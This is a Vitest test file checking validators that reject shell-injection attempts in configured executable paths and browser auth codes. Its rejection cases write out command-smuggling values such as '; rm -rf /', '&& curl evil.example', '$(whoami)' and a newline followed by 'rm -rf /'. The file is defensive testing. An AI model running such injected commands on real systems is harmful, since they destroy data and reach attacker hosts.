import { describe, expect, it } from "vitest";
import { assertSafeCode, assertSafeExecutablePath } from "../src/setup-token/session.js";

/**
 * `script -c` takes a shell string, so the configured executable path is
 * interpolated into a shell. Both paths come from operator configuration, and
 * configuration is editable — so both are validated rather than quoted and
 * hoped for.
 */
describe("assertSafeExecutablePath", () => {
  it.each([
    "/usr/local/bin/claude",
    "/usr/bin/script",
    "/opt/claude-code/bin/claude-2.1",
  ])("accepts %s", (value) => {
    expect(() => assertSafeExecutablePath(value)).not.toThrow();
  });

  it("rejects a relative path, which could resolve anywhere", () => {
    expect(() => assertSafeExecutablePath("claude")).toThrow(/absolute/i);
  });

  it.each([
    "/usr/bin/claude; rm -rf /",
    "/usr/bin/claude && curl evil.example",
    "/usr/bin/$(whoami)/claude",
    "/usr/bin/claude`id`",
    "/usr/bin/claude |tee /tmp/x",
    "/usr/bin/claude\nrm -rf /",
  ])("refuses shell metacharacters in %s", (value) => {
    expect(() => assertSafeExecutablePath(value)).toThrow(/not safe/i);
  });
});

describe("assertSafeCode", () => {
  it("accepts an opaque browser code", () => {
    expect(() => assertSafeCode("abc123#st4te")).not.toThrow();
  });

  it.each([
    ["an empty code", ""],
    ["a code carrying a newline", "abc\nrm -rf /"],
    ["a code carrying a space", "abc def"],
    ["an absurdly long code", "a".repeat(513)],
  ])("rejects %s", (_label, value) => {
    expect(() => assertSafeCode(value)).toThrow();
  });
});
